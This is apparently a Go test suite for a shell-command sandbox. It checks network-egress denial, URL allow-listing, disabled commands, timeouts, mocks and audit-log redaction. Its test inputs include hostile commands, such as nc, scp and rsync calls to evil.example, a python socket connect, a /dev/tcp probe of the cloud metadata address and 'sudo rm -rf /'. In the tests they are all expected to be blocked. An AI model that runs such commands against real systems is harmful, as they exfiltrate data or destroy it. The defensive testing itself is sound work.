package sandbox

import (
	"bytes"
	"context"
	"regexp"
	"strings"
	"testing"
	"time"

	"mvdan.cc/sh/v3/expand"
	"mvdan.cc/sh/v3/interp"

	"github.com/rezen/smash/internal/command"
)

// TestEgressGuardGeneralizes proves the ONE parser-driven guard covers commands
// far beyond openssl — ssh, nc, and git remote ops are all denied uniformly.
func TestEgressGuardGeneralizes(t *testing.T) {
	for _, script := range []string{
		`ssh user@evil.example uptime`,
		`nc evil.example 4444`,
		`git clone https://evil.example/repo`,           // github.com is a default git host now; see TestGitEgress
		`openssl s_client -connect 169.254.169.254:443`, // allow-listed for dgst, denied for s_client
		`rsync -avz ./sandbox/ user@evil.example:/srv/`,
		`scp secret.txt evil.example:/tmp/`,
		`perl -MLWP::Simple -e 'getstore("https://evil.example/x", "f")'`,
		`python3 -c 'import socket;s=socket.socket();s.connect(("10.0.0.1",1234))'`,
		`python3 -m http.server 8000`,
		`telnet evil.example 4444`,
		`dig @8.8.8.8 evil.example`,
		`gpg --keyserver hkps://keys.evil.example --recv-keys ABCD`,
		`docker pull evil.example/image`,
	} {
		_, er, err := runConfined(t, script)
		if err == nil || !strings.Contains(er, "network egress denied") {
			t.Errorf("%q should be denied by the egress guard; stderr=%q err=%v", script, er, err)
		}
	}
}

// TestShCInterpretedConfined proves `sh -c` is parsed and re-run through the full
// sandbox instead of executing a real shell — so the escape hatch is closed.
func TestShCInterpretedConfined(t *testing.T) {
	// A confined command that's allowed actually runs.
	if o, er, err := runConfined(t, `sudo -E sh -c 'echo CONFINED_OK'`); err != nil || !strings.Contains(o, "CONFINED_OK") {
		t.Errorf("sudo sh -c echo should run confined; out=%q stderr=%q err=%v", o, er, err)
	}
	// curl inside sh -c still hits the URL allow-list.
	if _, er, err := runConfined(t, `sh -c 'curl -sSfL https://evil.example/x -o /tmp/y'`); err == nil ||
		!strings.Contains(er, "URL not in allow-list") {
		t.Errorf("curl inside sh -c should be denied; stderr=%q err=%v", er, err)
	}
	// Nested sh -c: the egress guard still fires at the inner level.
	if _, er, err := runConfined(t, `sh -c 'sh -c "openssl s_client -connect evil:443"'`); err == nil ||
		!strings.Contains(er, "network egress denied: openssl") {
		t.Errorf("nested sh -c openssl should be caught; stderr=%q err=%v", er, err)
	}
}

// TestExecutionTimeout is the hard backstop: a runaway loop (which no sleep cap
// or command guard would stop) is killed by the context deadline.
func TestExecutionTimeout(t *testing.T) {
	start := time.Now()
	_, _, err := runConfined(t, `while true; do :; done`, func(c *Config) { c.Timeout = 300 * time.Millisecond })
	if err == nil {
		t.Fatal("expected the runaway loop to be killed by the timeout")
	}
	if elapsed := time.Since(start); elapsed > 5*time.Second {
		t.Errorf("timeout took too long to fire: %v", elapsed)
	}
}

// TestWrappersCannotSmuggle proves the security point: a wrapper cannot sneak a
// command past the guards. The real command is enforced, not the wrapper.
func TestWrappersCannotSmuggle(t *testing.T) {
	cases := []struct{ script, want string }{
		// curl behind `env` is still served in-process and denied by the URL allow-list.
		{`env FOO=bar curl -sSfL https://evil.example/x -o /tmp/y`, "URL not in allow-list"},
		// openssl s_client behind `timeout` is still caught by the egress guard.
		{`timeout 5 openssl s_client -connect evil.example:443`, "network egress denied: openssl"},
		// sudo is de-escalated (never really runs) and the inner command is enforced:
		// apt-get is a modelled package manager, so its install is an egress denial.
		{`sudo -E apt-get install docker-ce`, "network egress denied: apt-get → install"},
		// an unmodelled command behind sudo still falls to the allow-list.
		{`sudo -E dpkg-reconfigure tzdata`, "blocked command: dpkg-reconfigure"},
		// find -exec smuggling curl to an off-list host is still caught.
		{`find . -exec curl -sSfL https://evil.example/x -o /tmp/y \;`, "URL not in allow-list"},
	}
	for _, c := range cases {
		if _, er, err := runConfined(t, c.script); err == nil || !strings.Contains(er, c.want) {
			t.Errorf("%q should fail with %q; stderr=%q err=%v", c.script, c.want, er, err)
		}
	}
}

func TestParseSleep(t *testing.T) {
	ok := map[string]float64{"20": 20, "20s": 20, "1m": 60, "2h": 7200, "0.5": 0.5}
	for in, wantSec := range ok {
		d, valid := parseSleep(in)
		if !valid || d.Seconds() != wantSec {
			t.Errorf("parseSleep(%q) = %v,%v; want %vs", in, d, valid, wantSec)
		}
	}
	for _, bad := range []string{"abc", "-5", ""} {
		if _, valid := parseSleep(bad); valid {
			t.Errorf("parseSleep(%q) should be invalid", bad)
		}
	}
}

// TestSleepCapped confirms a long sleep is capped rather than burning wall-time.
func TestSleepCapped(t *testing.T) {
	out, er, err := runConfined(t, "sleep 300; echo done")
	if err != nil || !strings.Contains(out, "done") {
		t.Fatalf("expected sleep to be capped and continue; out=%q err=%v", out, err)
	}
	if !strings.Contains(er, "capped sleep 300") {
		t.Errorf("expected a cap notice; stderr=%q", er)
	}
}

// TestDevTCPDenied: a raw socket via bash's /dev/tcp is seen by the open
// handler and refused, with no curl involved.
func TestDevTCPDenied(t *testing.T) {
	_, er, err := runConfined(t, "cat < /dev/tcp/169.254.169.254/80")
	if err == nil || !strings.Contains(er, "tcp socket attempt detected: 169.254.169.254:80") {
		t.Errorf("expected the /dev/tcp probe to be denied; stderr=%q err=%v", er, err)
	}
}

// TestTypesetShim unit-tests the shim decision: bare escaped declarations become
// a successful no-op; anything carrying an assignment is left alone.
func TestTypesetShim(t *testing.T) {
	noop := [][]string{
		{"typeset", "path", "partition", "test_exec"}, // rvm line 798
		{"declare", "a", "b"},
		{"typeset"},
	}
	passthrough := [][]string{
		{"typeset", "x=1"},           // assignment — never silently dropped
		{"declare", "-a", "y=(a b)"}, // assignment present
		{"local", "z"},               // not typeset/declare
		{"echo", "hi"},
	}
	for _, a := range noop {
		if got, ok := shimDeclarationBuiltin(a); !ok || len(got) != 1 || got[0] != "true" {
			t.Errorf("shim(%v) = %v,%v; want [true],true", a, got, ok)
		}
	}
	for _, a := range passthrough {
		if _, ok := shimDeclarationBuiltin(a); ok {
			t.Errorf("shim(%v) should pass through untouched", a)
		}
	}
}

// TestTypesetShimUnderErrexit reproduces rvm's exact failure mode: an escaped
// `\typeset` under `set -e`. Without the shim mvdan/sh's "unsupported builtin"
// exit-2 aborts the script; with it, execution continues.
func TestTypesetShimUnderErrexit(t *testing.T) {
	out, er, err := runConfined(t, "set -e\n\\typeset a b c\necho reached")
	if err != nil || !strings.Contains(out, "reached") {
		t.Errorf("expected execution to continue past \\typeset under set -e; out=%q err=%v stderr=%q", out, err, er)
	}
}

// TestErrtraceIsAKnownGap documents a real mvdan/sh limitation surfaced by rvm:
// `set -o errtrace` is not supported. It's non-fatal (reported and skipped), but
// worth pinning so the behavior is intentional, not a surprise.
func TestErrtraceIsAKnownGap(t *testing.T) {
	out, er, err := runConfined(t, "set -o errtrace; echo reached")
	if !strings.Contains(er, "errtrace") {
		t.Errorf("expected an errtrace-unsupported notice on stderr, got: %q", er)
	}
	if !strings.Contains(out, "reached") || err != nil {
		t.Errorf("expected execution to continue after errtrace; out=%q err=%v", out, err)
	}
}

// TestAuditLog: with Config.Audit set, every executed command is logged as
// "name: action kind value", with piped stages showing their streams and
// secrets (header values) kept out.
func TestAuditLog(t *testing.T) {
	var audit bytes.Buffer
	_, _, _ = runConfined(t, `
echo hi > f.txt
basename /a/b.txt
cat f.txt | sha256sum
chmod 600 f.txt
cp f.txt g.txt; rm -rf g.txt
curl -sSf -H 'Authorization: Bearer SECRET' https://evil.example/x
mysql -h db.example -u root -p SECRET2 app
`, func(c *Config) { c.Auditor = TextAuditor(&audit) })
	got := audit.String()
	for _, want := range []string{
		"- name: basename\n  resources: [operand /a/b.txt]\n", // echo is a shell builtin and never reaches exec
		"- name: cat\n  resources: [read path f.txt]\n",
		"- name: sha256sum\n  resources: [read stdin]\n",
		"- name: chmod\n  resources: [apply mode 600, modify path f.txt]\n",
		"  files: [mode f.txt]\n",
		"- name: cp\n  resources: [copy path f.txt → g.txt]\n",
		"- name: rm\n  resources: [delete path g.txt]\n",
		"  files: [delete g.txt (recursive)]\n",
		"- name: curl\n  resources: [fetch url https://evil.example/x, write stdout]\n",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("audit log missing %q; got:\n%s", want, got)
		}
	}
	if strings.Contains(got, "SECRET") {
		t.Errorf("audit log leaked a header value or password:\n%s", got)
	}
	if strings.Contains(got, "files: [copy") || strings.Contains(got, "Cookies:") {
		t.Errorf("files must not repeat the resources, and unset params are not listed:\n%s", got)
	}
	if !strings.Contains(got, "  command: curl -sSf -H REDACTED https://evil.example/x\n") ||
		!strings.Contains(got, "-p REDACTED") {
		t.Errorf("secrets should be redacted, not dropped:\n%s", got)
	}
}

// TestAuditShellOpens: the shell's own opens — redirections and `source` —
// never reach the exec chain, so they are reported through OpenAuditor with
// their outcome. /dev/null is noise and is skipped.
func TestAuditShellOpens(t *testing.T) {
	var audit bytes.Buffer
	_, _, _ = runConfined(t, `
echo hi > f.txt
echo more >> f.txt
cat < f.txt
cat < missing.txt
echo 'X=1' > lib.sh; . ./lib.sh
echo noise > /dev/null 2>/dev/null
`, func(c *Config) { c.Auditor = TextAuditor(&audit) })
	got := audit.String()
	for _, want := range []string{
		"- name: shell\n  resources: [write path f.txt]\n",
		"- name: shell\n  resources: [append path f.txt]\n",
		"- name: shell\n  resources: [read path f.txt]\n",
		"- name: shell\n  resources: [read path missing.txt]\n  error: \"open ", "missing.txt: no such file or directory\"\n",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("audit log missing %q; got:\n%s", want, got)
		}
	}
	if !regexp.MustCompile(`- name: shell\n  resources: \[read path /\S*/lib\.sh\]\n`).MatchString(got) { // `source` resolves the path
		t.Errorf("audit log missing the sourced lib.sh; got:\n%s", got)
	}
	if strings.Contains(got, "/dev/null") {
		t.Errorf("/dev/null opens should not be logged:\n%s", got)
	}
	// A bare AuditorFunc opts out; a typed OpenAuditor sees records with the
	// FileChange a monitor wants.
	var opens []OpenRecord
	_, _, _ = runConfined(t, `echo hi >> f.txt`, func(c *Config) { c.Auditor = recorder{opens: &opens} })
	if len(opens) != 1 || opens[0].Op != OpenAppend || opens[0].Err != nil {
		t.Fatalf("opens = %+v, want one successful append", opens)
	}
	if c, ok := opens[0].Change(); !ok || c.Op != command.FileAppend || c.Path != "f.txt" {
		t.Errorf("Change() = %+v/%v, want append f.txt", c, ok)
	}
}

type recorder struct{ opens *[]OpenRecord }

func (recorder) Audit(AuditRecord)          {}
func (r recorder) AuditOpen(rec OpenRecord) { *r.opens = append(*r.opens, rec) }

// TestAuditDataCapture: with AuditData set, a record carries the typed params
// and the bytes that flowed through the command's stdin and stdout — here the
// input to base64 and its encoded output — capped at the configured size.
func TestAuditDataCapture(t *testing.T) {
	var recs []AuditRecord
	out, _, err := runConfined(t, `printf hi | base64; printf 0123456789 | base64`, func(c *Config) {
		c.Allowed = c.Allowed.With("base64")
		c.AuditData = 8
		c.Auditor = auditInto(&recs)
	})
	if err != nil || !strings.Contains(out, "aGk=") {
		t.Fatalf("base64 should run; out=%q err=%v", out, err)
	}
	var b64 []AuditRecord
	for _, r := range recs {
		if r.Name == "base64" {
			b64 = append(b64, r)
		}
	}
	if len(b64) != 2 {
		t.Fatalf("expected 2 base64 records, got %d: %+v", len(b64), recs)
	}
	first := b64[0]
	if _, ok := first.Params.(command.Base64Params); !ok || first.Command != "base64" {
		t.Errorf("params/command wrong: %T %q", first.Params, first.Command)
	}
	if string(first.Stdin.Data) != "hi" || first.Stdin.Total != 2 {
		t.Errorf("stdin capture = %q/%d, want hi/2", first.Stdin.Data, first.Stdin.Total)
	}
	if got := strings.TrimSpace(string(first.Stdout.Data)); got != "aGk=" || first.Exit != nil {
		t.Errorf("stdout capture = %q exit=%v, want aGk=/nil", first.Stdout.Data, first.Exit)
	}
	// The cap keeps the first 8 bytes but still counts everything.
	if second := b64[1]; string(second.Stdin.Data) != "01234567" || second.Stdin.Total != 10 {
		t.Errorf("capped stdin = %q/%d, want 01234567/10", second.Stdin.Data, second.Stdin.Total)
	}
	// The YAML form renders params and data.
	var txt bytes.Buffer
	TextAuditor(&txt).Audit(first)
	for _, want := range []string{"- name: base64\n  resources: [read stdin]\n  command: base64\n  exit: 0\n", `stdin: {bytes: 2, data: "hi"}`, `stdout: {bytes: `, `, data: "aGk=`} {
		if !strings.Contains(txt.String(), want) {
			t.Errorf("text record missing %q:\n%s", want, txt.String())
		}
	}
	if strings.Contains(txt.String(), "params:") {
		t.Errorf("bare base64 has no set params, so no params line:\n%s", txt.String())
	}
	// Set fields are listed as a flow mapping tagged with the bare type name.
	txt.Reset()
	first.Params = command.Base64Params{Decode: true, File: "x"}
	TextAuditor(&txt).Audit(first)
	if !strings.Contains(txt.String(), "  params: !Base64Params {Decode: true, File: x}\n") {
		t.Errorf("compact params line missing:\n%s", txt.String())
	}
}

// TestWithHandlerContext pins patches/sh/handlerctx.patch: data capture hands
// the inner handler a context carrying substituted streams, and this is the
// exported constructor that makes that possible. If a resync drops the patch,
// this stops compiling rather than silently losing every captured byte.
func TestWithHandlerContext(t *testing.T) {
	want := interp.HandlerContext{Dir: "/somewhere"}
	got := interp.HandlerCtx(interp.WithHandlerContext(context.Background(), want))
	if got.Dir != want.Dir {
		t.Errorf("HandlerCtx(...).Dir = %q, want %q", got.Dir, want.Dir)
	}
}

// TestDisable: a disabled command never runs — not when allow-listed, not
// behind sudo or find -exec, not inside sh -c, and not from inside the sandbox.
func TestDisable(t *testing.T) {
	disable := func(c *Config) { c.Disable("rm", "rmdir") }
	for _, script := range []string{
		`rm -rf x`,
		`sudo rm -rf /`,
		`find . -exec rm {} \;`,
		`sh -c 'rmdir d'`,
		`mkdir -p bin && cp /bin/rm bin/rm && PATH=$PWD/bin:$PATH rm -f x`, // inside Root: still disabled
	} {
		_, er, err := runConfined(t, script, disable)
		if err == nil || !strings.Contains(er, "disabled command: rm") {
			t.Errorf("%q should be disabled; stderr=%q err=%v", script, er, err)
		}
	}
	// Other allow-listed commands are unaffected.
	if out, _, err := runConfined(t, `mkdir d && echo ok`, disable); err != nil || !strings.Contains(out, "ok") {
		t.Errorf("mkdir should still run; out=%q err=%v", out, err)
	}
}

// TestMocks: matchers select invocations; the mock supplies stdout, stderr and
// the exit code, records its calls, and pre-empts the network and the
// allow-list.
func TestMocks(t *testing.T) {
	var uname, fetch, fail, dyn *Mock
	out, er, err := runConfined(t, `
uname -s
curl -sSfL https://releases.astral.sh/x -o /dev/null && echo fetched
if frobnicate --flag; then echo unexpected; else echo "frob failed $?"; fi
version 1; version 2
`, func(c *Config) {
		uname = c.Mock(MatchArgs("uname", "-s"), "Linux\n", "", 0)
		fetch = c.Mock(MatchName("curl").And(MatchResource("url", "https://releases.astral.sh/*")), "", "", 0)
		fail = c.Mock(MatchGlob("frobnicate *"), "", "frobnicate: boom\n", 3)
		dyn = c.MockFunc(MatchPrefix("version"), func(p command.ParsedCommand) (string, string, int) {
			return "v" + p.Operands[0] + "\n", "", 0
		})
	})
	if err != nil {
		t.Fatalf("script failed: %v\nstderr=%s", err, er)
	}
	for _, want := range []string{"Linux\n", "fetched\n", "frob failed 3\n", "v1\nv2\n"} {
		if !strings.Contains(out, want) {
			t.Errorf("stdout missing %q:\n%s", want, out)
		}
	}
	if !strings.Contains(er, "frobnicate: boom") {
		t.Errorf("stderr missing mock stderr: %q", er)
	}
	if uname.Called() != 1 || fetch.Called() != 1 || fail.Called() != 1 || dyn.Called() != 2 {
		t.Errorf("call counts: uname=%d fetch=%d fail=%d dyn=%d", uname.Called(), fetch.Called(), fail.Called(), dyn.Called())
	}
	if c := fetch.Calls()[0]; c.TypedParams().(command.CurlParams).URL != "https://releases.astral.sh/x" {
		t.Errorf("recorded call has wrong params: %+v", c.TypedParams())
	}
	// Globs cross slashes: a URL pattern matches deep paths, and a non-match stays a non-match.
	if !MatchResource("url", "https://api.example/app/*")(command.Parse([]string{"curl", "https://api.example/app/a/b/c"})) {
		t.Error("MatchResource glob should match across '/'")
	}
	if MatchGlob("curl * -o out")(command.Parse([]string{"curl", "https://x", "-o", "other"})) {
		t.Error("MatchGlob matched the wrong command line")
	}
	// A mock does not match what it should not: an off-list curl still hits the URL allow-list.
	_, er, err = runConfined(t, `curl -sSf https://evil.example/x`, func(c *Config) {
		c.Mock(MatchName("curl").And(MatchResource("url", "https://releases.astral.sh/*")), "", "", 0)
	})
	if err == nil || !strings.Contains(er, "URL not in allow-list") {
		t.Errorf("non-matching curl should not be mocked; stderr=%q err=%v", er, err)
	}
	// Denial wins over a mock.
	_, er, err = runConfined(t, `rm -rf x`, func(c *Config) {
		c.Disable("rm")
		c.Mock(MatchName("rm"), "", "", 0)
	})
	if err == nil || !strings.Contains(er, "disabled command: rm") {
		t.Errorf("a disabled command must not be mocked back; stderr=%q err=%v", er, err)
	}
}

// TestAuditReasonSurvivesDiscardedStderr: when the sandbox itself fails a
// command, the audit record says why even if the script sent stderr to
// /dev/null (as installers do around a spinner). Without this the log would
// show only "exit 6".
func TestAuditReasonSurvivesDiscardedStderr(t *testing.T) {
	var recs []AuditRecord
	_, er, err := runConfined(t, `curl -L https://evil.example/x -o /dev/null >/dev/null 2>&1; echo rc=$?
ps >/dev/null 2>&1; echo ok`, func(c *Config) {
		c.Auditor = auditInto(&recs)
	})
	if err != nil {
		t.Fatalf("script failed: %v\nstderr=%s", err, er)
	}
	if strings.Contains(er, "not in allow-list") {
		t.Errorf("stderr should have been discarded by the script, got %q", er)
	}
	var curl *AuditRecord
	for i := range recs {
		if recs[i].Name == "curl" {
			curl = &recs[i]
		}
	}
	if curl == nil {
		t.Fatalf("no curl record in %+v", recs)
	}
	if code, ok := interp.IsExitStatus(curl.Exit); !ok || code != 6 {
		t.Errorf("curl exit = %v, want exit 6", curl.Exit)
	}
	if !strings.Contains(curl.Reason, "URL not in allow-list: https://evil.example/x") {
		t.Errorf("curl reason = %q", curl.Reason)
	}
	// A command that really ran carries no sandbox reason.
	for _, r := range recs {
		if r.Name == "ps" && r.Reason != "" {
			t.Errorf("ps reason = %q, want none", r.Reason)
		}
	}
	// The text auditor prints it after the exit status, quoted since it holds "[".
	var b strings.Builder
	TextAuditor(&b).Audit(*curl)
	if line := b.String(); !strings.Contains(line, "  exit: 6\n  reason: \"curl: [sandbox] URL not in allow-list") {
		t.Errorf("text auditor line: %s", line)
	}
}

// TestTextAuditorShortPaths: with ShortPaths the text log writes sandbox
// paths as ~/…, $TMPDIR/… and $ROOT/…, but only whole path components.
func TestTextAuditorShortPaths(t *testing.T) {
	root := "/srv/box"
	cfg := NewConfig(root, root, expand.ListEnviron("HOME="+root+"/home", "TMPDIR="+root+"/tmp"))
	var b strings.Builder
	a := TextAuditor(&b, ShortPaths(cfg))
	a.Audit(AuditRecord{
		Name:      "mv",
		Command:   "mv /srv/box/tmp/x /srv/box/home/.local/bin/x",
		Resources: []command.Resource{{Kind: "path", Action: "move", Value: "/srv/box/tmp/x → /srv/box/home/.local/bin/x"}},
		Files:     []command.FileChange{{Op: command.FileMove, From: "/srv/box/tmp/x", Path: "/srv/box/home/.local/bin/x"}},
	})
	a.(OpenAuditor).AuditOpen(OpenRecord{Path: "/srv/box/homework/f", Op: OpenWrite})
	a.(OpenAuditor).AuditOpen(OpenRecord{Path: "/srv/box", Op: OpenRead})
	want := "- name: mv\n" +
		"  resources: [move path $TMPDIR/x → ~/.local/bin/x]\n" +
		"  command: mv $TMPDIR/x ~/.local/bin/x\n" +
		"  exit: 0\n" +
		"  duration: <1ms\n" +
		"- name: shell\n  resources: [write path $ROOT/homework/f]\n" +
		"- name: shell\n  resources: [read path $ROOT]\n"
	if b.String() != want {
		t.Errorf("got:\n%s\nwant:\n%s", b.String(), want)
	}
}

// TestReturnInSubshellInsideFunc: bash lets a function `return` from inside a
// subshell (it just ends the subshell); mvdan/sh rejects it. The parse-time
// rewrite in fixups.go closes the gap. A top-level `return` in a subshell is
// still an error, as in bash, and a function defined inside a subshell keeps a
// real `return`. The `k` case is the client9/shlib idiom every godownloader
// installer uses — `f() ( … return … )`, a function whose body is a subshell —
// which is what tripped the trufflehog installer.
func TestReturnInSubshellInsideFunc(t *testing.T) {
	out, stderr, err := runConfined(t, `
f() { x=$(echo hi; return 3); echo "f x=$x rc=$?"; }
f
g() { (return 7); echo "g rc=$?"; }
g
h() { { echo a; return 4; } | cat; echo "h rc=$?"; }
h
i() { inner() { return 5; }; (inner; echo "i inner rc=$?"); }
i
j() { x="$(missing_tool 2>/dev/null || return 9)"; echo "j rc=$?"; }
j
k() ( case $1 in ok) return 0 ;; esac; return 6; )
k ok; echo "k ok rc=$?"; k bad; echo "k bad rc=$?"
(return 2); echo "top rc=$?"
`)
	if err != nil {
		t.Fatalf("script failed: %v\nstderr: %s", err, stderr)
	}
	want := "f x=hi rc=3\ng rc=7\na\nh rc=0\ni inner rc=5\nj rc=9\nk ok rc=0\nk bad rc=6\ntop rc=1\n"
	if out != want {
		t.Errorf("stdout:\n%s\nwant:\n%s", out, want)
	}
	if strings.Count(stderr, "return: can only be done from a func") != 1 { // only the top-level one
		t.Errorf("stderr:\n%s", stderr)
	}
}
